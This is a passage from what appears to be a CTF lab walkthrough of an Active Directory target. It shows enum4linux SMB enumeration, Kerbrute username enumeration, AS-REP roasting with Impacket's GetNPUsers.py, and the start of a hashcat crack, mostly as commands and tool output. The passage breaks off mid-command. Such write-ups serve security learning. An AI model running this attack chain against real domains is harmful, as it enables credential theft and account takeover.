&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We'll use enum4linux to gather some additional information from the Samba shares (139/445) on the target.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;enum4linux&lt;/span&gt; 10.10.177.198&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This produces a lot of noise (I've all of the output to STDERR below) as the target is fairly locked down. But there's a few interesting things here.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Dec 30 20:55:33 2021
 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.177.198
RID Range ........ 500-550,1000-1050
Username ......... &amp;#39;&amp;#39;
Password ......... &amp;#39;&amp;#39;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.177.198    |
 ===================================================== 
[E] Can&amp;#39;t find workgroup/domain


 ============================================= 
|    Nbtstat Information for 10.10.177.198    |
 ============================================= 
Looking up status of 10.10.177.198
No reply from 10.10.177.198

 ====================================== 
|    Session Check on 10.10.177.198    |
 ====================================== 
[+] Server 10.10.177.198 allows sessions using username &amp;#39;&amp;#39;, password &amp;#39;&amp;#39;
[+] Got domain/workgroup name: 

 ============================================ 
|    Getting domain SID for 10.10.177.198    |
 ============================================ 
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)

 ======================================= 
|    OS information on 10.10.177.198    |
 ======================================= 
[+] Got OS info for 10.10.177.198 from smbclient: 
[+] Got OS info for 10.10.177.198 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================== 
|    Users on 10.10.177.198    |
 ============================== 
[E] Couldn&amp;#39;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn&amp;#39;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ========================================== 
|    Share Enumeration on 10.10.177.198    |
 ========================================== 
do_connect: Connection to 10.10.177.198 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

    Sharename       Type      Comment
    ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.177.198

 ===================================================== 
|    Password Policy Information for 10.10.177.198    |
 ===================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.177.198 using a NULL share

[+] Trying protocol 139/SMB...

    [!] Protocol failed: Cannot request session (Called Name:10.10.177.198)

[+] Trying protocol 445/SMB...

    [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


[E] Failed to get password policy with rpcclient


 =============================== 
|    Groups on 10.10.177.198    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.10.177.198 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963
[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833
[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username &amp;#39;&amp;#39;, password &amp;#39;&amp;#39;
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-503 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-504 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-505 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-506 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-507 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-508 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-509 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-510 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-511 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-ADnterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-523 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-524 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-ADnterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-528 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-529 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-530 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-531 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-532 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-533 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-534 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-535 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-536 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-537 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-538 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-539 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-540 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-541 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-542 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-543 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-544 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-545 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-546 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-547 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-548 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-549 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-550 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
S-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1002 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1003 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1004 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1005 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1006 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1007 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1008 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1009 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1010 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1011 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1012 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1013 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1014 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1015 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1016 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1017 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1018 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1019 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1020 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1021 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1022 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1023 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1024 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1025 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1026 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1027 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1028 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1029 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1030 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1031 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1032 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1033 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1034 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1035 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1036 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1037 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1038 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1039 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1040 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1041 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1042 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1043 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1044 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1045 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1046 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1047 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1048 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1049 *unknown*\*unknown* (8)
S-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username &amp;#39;&amp;#39;, password &amp;#39;&amp;#39;
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-502 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-505 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-506 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-507 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-508 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-509 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-510 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-511 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-512 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)
S-1-5-21-3532885019-1334016158-1514108833-514 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-515 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-516 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-517 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-518 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-519 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-520 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-521 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-522 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-523 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-524 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-525 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-526 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-527 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-528 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-529 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-530 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-531 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-532 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-533 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-534 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-535 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-536 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-537 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-538 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-539 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-540 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-541 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-542 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-543 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-544 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-545 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-546 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-547 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-548 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-549 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-550 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1000 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1001 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1002 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1003 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1004 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1005 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1006 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1007 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1008 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1009 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1010 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1011 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1012 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1013 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1014 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1015 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1016 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1017 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1018 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1019 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1020 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1021 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1022 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1023 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1024 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1025 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1026 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1027 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1028 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1029 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1030 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1031 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1032 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1033 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1034 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1035 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1036 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1037 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1038 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1039 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1040 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1041 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1042 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1043 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1044 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1045 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1046 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1047 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1048 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1049 *unknown*\*unknown* (8)
S-1-5-21-3532885019-1334016158-1514108833-1050 *unknown*\*unknown* (8)

 ============================================== 
|    Getting printer info for 10.10.177.198    |
 ============================================== 
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED

enum4linux complete on Thu Dec 30 21:05:30 2021
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There's honestly not much here, though we can see that the NETBIOS domain name for the target is THM-AD.&lt;/p&gt;&lt;p&gt;The AD domain itself is using the standard (invalid) .local TLD, but that's not actually something that enum4linux tells us â instead, we can see this in the earlier output from nmap.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;enumerating-users-via-kerberos&quot;&gt;Enumerating Users via Kerberos&lt;/h2&gt;&lt;p&gt;We'll now try to enumerate users using Kerbrute and the provided user list.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;kerbrute&lt;/span&gt; userenum --dc 10.10.177.198 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;--domain&lt;/span&gt; spookysec.local &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-3&quot;&gt;&lt;a href=&quot;#cb5-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;ex&quot;&gt;--output&lt;/span&gt; attacktive-director.kerbrute &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb5-4&quot;&gt;&lt;a href=&quot;#cb5-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                           &lt;span class=&quot;ex&quot;&gt;userlist.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This produces the following output.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/30/21 - Ronnie Flathers @ropnop

2021/12/30 21:12:56 &amp;gt;  Using KDC(s):
2021/12/30 21:12:56 &amp;gt;   10.10.177.198:88

2021/12/30 21:12:56 &amp;gt;  [+] VALID USERNAME:       james@spookysec.local
2021/12/30 21:12:59 &amp;gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
2021/12/30 21:13:03 &amp;gt;  [+] VALID USERNAME:       James@spookysec.local
2021/12/30 21:13:05 &amp;gt;  [+] VALID USERNAME:       robin@spookysec.local
2021/12/30 21:13:20 &amp;gt;  [+] VALID USERNAME:       darkstar@spookysec.local
2021/12/30 21:13:30 &amp;gt;  [+] VALID USERNAME:       administrator@spookysec.local
2021/12/30 21:13:49 &amp;gt;  [+] VALID USERNAME:       backup@spookysec.local
2021/12/30 21:13:58 &amp;gt;  [+] VALID USERNAME:       paradox@spookysec.local
2021/12/30 21:14:55 &amp;gt;  [+] VALID USERNAME:       JAMES@spookysec.local
2021/12/30 21:15:14 &amp;gt;  [+] VALID USERNAME:       Robin@spookysec.local
2021/12/30 21:17:10 &amp;gt;  [+] VALID USERNAME:       Administrator@spookysec.local
2021/12/30 21:20:59 &amp;gt;  [+] VALID USERNAME:       Darkstar@spookysec.local
2021/12/30 21:22:12 &amp;gt;  [+] VALID USERNAME:       Paradox@spookysec.local
2021/12/30 21:26:17 &amp;gt;  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2021/12/30 21:27:26 &amp;gt;  [+] VALID USERNAME:       ori@spookysec.local
2021/12/30 21:29:37 &amp;gt;  [+] VALID USERNAME:       ROBIN@spookysec.local
2021/12/30 21:35:06 &amp;gt;  Done! Tested 73317 usernames (16 valid) in 1330.206 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We'll be targeting the &lt;code&gt;svc-admin&lt;/code&gt; and &lt;code&gt;backup&lt;/code&gt; accounts. (These are supposed to &quot;jump out&quot; at me, but honestly I'm not sure why they're more interesting than the other users, or &lt;code&gt;administrator&lt;/code&gt;. Maybe because they're &lt;em&gt;not&lt;/em&gt; obviously people but also not the &lt;code&gt;administrator&lt;/code&gt; account?)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/Sq00ky/attacktive-directory-tools/blob/master/userlist.txt&quot;&gt;attacktive-directory-tools / userlist.txt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Kerbrute.md&quot;&gt;Using Kerbrute&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;abusing-kerberos&quot;&gt;Abusing Kerberos&lt;/h2&gt;&lt;p&gt;We're going to try AS-REP Roasting using Impacket's GetNPUsers.py script. We first create an &lt;code&gt;attacktive-directory.targets&lt;/code&gt; file containing the following:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;svc-admin
backup
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then, we feed this to the GetNPUsers.py script.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb8-1&quot;&gt;&lt;a href=&quot;#cb8-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-2&quot;&gt;&lt;a href=&quot;#cb8-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;/usr/share/doc/python3-impacket/examples/GetNPUsers.py&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-3&quot;&gt;&lt;a href=&quot;#cb8-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;-outputfile&lt;/span&gt; attacktive-directory.getnpusers &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-4&quot;&gt;&lt;a href=&quot;#cb8-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;-usersfile&lt;/span&gt; attacktive-directory.targets &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-5&quot;&gt;&lt;a href=&quot;#cb8-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;-dc-ip&lt;/span&gt; 10.10.177.198 spookysec.local/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;GetNPUsers.py reports that &lt;code&gt;backup&lt;/code&gt; isn't vulnerable to AS-REP roasting, but &lt;code&gt;svc-admin&lt;/code&gt; &lt;em&gt;is&lt;/em&gt; vulnerable and we get back a valid hashcat password hash.&lt;/p&gt;&lt;p&gt;A quick lookup in the hashcat example hashes wiki page shows that this is a &quot;Kerberos 5, etype 23, AS-REP&quot; hash (hashcat mode 18200). We'll crack this using the provided password list.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb9&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb9-1&quot;&gt;&lt;a href=&quot;#cb9-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hashcat&lt;/span&gt; -m 18200 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-2&quot;&gt;&lt;a href=&quot;#cb9-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;        &lt;span class=&quot;ex&quot;&gt;-O&lt;/span&gt; attacktive-directory.getnpusers &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
